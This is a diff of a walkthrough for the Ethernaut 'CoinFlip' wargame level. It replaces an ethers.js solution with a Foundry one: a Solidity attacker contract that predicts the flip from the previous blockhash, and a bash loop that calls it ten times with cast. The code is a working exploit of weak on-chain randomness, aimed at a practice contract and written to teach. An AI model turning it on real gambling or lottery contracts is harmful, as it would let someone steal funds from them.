@@ -46,76 +46,62 @@ contract CoinFlip {
 [Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)
 
 ## Solution
-Because the flip is calculated onchain using the previous blockhash, we can predict what the outcome will be by simulating the coinflip offchain and then submitting the right predition.
-
-This level does not use foundry as it will be solved using a simple [ethersjs](https://docs.ethers.io/v5/) script. 
-
->Feel free to contribute if you have a solution using only foundry (most likely using forge to make a contract to calculate the flip + call level instance)
+Because the flip is calculated onchain using the previous blockhash, we can predict what the outcome will be by simulating the coinflip on our custom smart contract and submitting the result.
 
 ### Walkthrough
 
-1. set up a node project
-```console
-npm init
+1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in the `src` directory
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
+
+contract FortuneTeller {
+    using SafeMath for uint256;
+    CoinFlip coinFlip;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlip) {
+        coinFlip = CoinFlip(_coinFlip);
+    }
+
+    function predictFuture() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        bool prediction = blockValue.div(FACTOR) == 1 ? true : false;
+
+        coinFlip.flip(prediction);
+    }
+}
+
+interface CoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
 ```
 
-2. install the dotenv and ethersjs package 
+2. deploy our new contract
 ```console
-npm install ethers
-npm install dotenv
+forge create src/Contract.sol:FortuneTeller --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
 ```
 
-3. create a `.env` file with the following variables
-- `PRIVATE_KEY`
-- `NODE_URL`
- 
+3. create a simple bashscript to flip the coin 10 times
 ```console
-touch .env
-ECHO PRIVATE_KEY=<your-private-key-here> >> .env
-ECHO NODE_URL=<your-node-url-here> >> .env
+touch flip.sh
 ```
-4. create a `src/coinFlip.js` file to hold our script
-
-```javascript
-const ethers = require('ethers');
-require('dotenv').config();
-
-const NODE_URL = process.env.RINKERBY;
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const LEVEL_ADDRESS = process.env.LEVEL_ADDRESS;
-
-const provider = new ethers.providers.JsonRpcProvider(NODE_URL);
-const wallet = new ethers.Wallet(PRIVATE_KEY);
-const signer = wallet.connect(provider);
-
-const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-const coinFlipContract = new ethers.Contract(
-  LEVEL_ADDRESS,
-  ["function flip(bool _guess) public returns (bool)"],
-  signer
-)
-
-let correctFlips = 0;
-
-provider.on('block', async (blockNum) => {
-  console.log("blockNum : ", blockNum);
-  let blockData = await provider.getBlock(blockNum);
-  let blockHash = blockData.hash;
-  let blockValue = parseInt(blockHash, 16);
-  let coinFlip = Math.floor(blockValue / FACTOR);
-  let side = coinFlip == 1 ? true : false;
-
-  const tx = await coinFlipContract.flip(side);
-  const promise = tx.wait();
-  const receipt = await promise;
-
-  correctFlips++;
-  console.log(correctFlips);
-})
+contents off `flip.sh`
+```bash
+#!/bin/bash
+for i in {1..10}
+do
+    cast send $DEPLOYED_ADDRESS "predictFuture()" --gas 80000 --private-key $PRIVATE_KEY
+    sleep 20s
+    echo Correct Flips : $i
+done
 ```
+> Replace $DEPLOYED_ADDRESS with the address of your deployed contract
 
-5. run the script that we just created
+4. run `flip.sh`
 ```console
-node src/coinFlip.js
+chmod 777 flip.sh
+./flip.sh
 ```
